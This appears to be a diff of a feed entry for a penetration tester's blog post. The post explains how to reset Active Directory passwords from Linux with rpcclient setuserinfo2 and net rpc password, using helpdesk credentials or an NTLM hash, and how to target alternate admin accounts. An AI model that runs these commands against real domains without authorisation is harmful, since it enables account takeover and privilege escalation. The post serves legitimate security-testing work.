@@ -30,30 +30,30 @@
 &lt;p&gt;I was unable to find any documentation on how to do this from a Linux host, or at the very least to do it without Active Directory Users and Computers (ADUC), which would require a Windows machine. And figuring out how to run ADUC through a meterpreter sessions wasn&amp;rsquo;t an hurdle I ever had time for in engagements. :)&lt;/p&gt;
 &lt;p&gt;Due to me being dumb and resetting a password of my own in my lab to something I couldn&amp;rsquo;t remember, I finally had the time to figure it out.&lt;/p&gt;
 &lt;p&gt;If you have Samba client tools (&lt;code&gt;smbclient&lt;/code&gt;) installed, you can use &lt;code&gt;rpcclient&lt;/code&gt;.  Out of the gate, you can auth with password or kerberos (this is especially useful in situations where you have dropped into a user that has an active kerberos token or you can make one):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@kali:~# rpcclient -U helpdesk //192.168.80.10
-Enter helpdesk&#39;s password:
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~# rpcclient -U helpdesk //192.168.80.10
+Enter helpdesk&amp;#39;s password:
 rpcclient $&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you have the package &lt;code&gt;passing-the-hash&lt;/code&gt;, you can even do this with just a NTLM hash.&lt;/p&gt;
 &lt;p&gt;In order to change a password you neet to use the &lt;code&gt;setuserinfo2&lt;/code&gt; command:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2
 Usage: setuserinfo2 username level password [password_expired]
 result was NT_STATUS_INVALID_PARAMETER
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You will not be able to change the password of anyone with &lt;code&gt;AdminCount = 1&lt;/code&gt; (aka Domain Admins and other high priv accounts):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 ima-domainadmin 23 &#39;ASDqwe123&#39;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 ima-domainadmin 23 &amp;#39;ASDqwe123&amp;#39;
 result: NT_STATUS_ACCESS_DENIED
 result was NT_STATUS_ACCESS_DENIED
 rpcclient $&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But you can very easily target users who have alternate admin accounts:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 adminuser 23 &#39;ASDqwe123&#39;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rpcclient $&amp;gt; setuserinfo2 adminuser 23 &amp;#39;ASDqwe123&amp;#39;
 rpcclient $&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yes it would be nice if there was any sort of confirmation&amp;hellip;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;The &lt;code&gt;23&lt;/code&gt; came from &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/cc245617.aspx&#34;&gt;this MSDN article&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;If you have the package &lt;code&gt;samba-common-bin&lt;/code&gt; you can also do this with the &lt;code&gt;net&lt;/code&gt; command:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@kali:~# net rpc password adminuser -U helpdesk -S 192.168.80.10
 Enter new password for adminuser:
-Enter helpdesk&#39;s password:
+Enter helpdesk&amp;#39;s password:
 root@kali:~#
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Huge thanks for &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;Beto Solino&lt;/a&gt; of &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt; fame for his help figuring this out.&lt;/p&gt;
 </description>
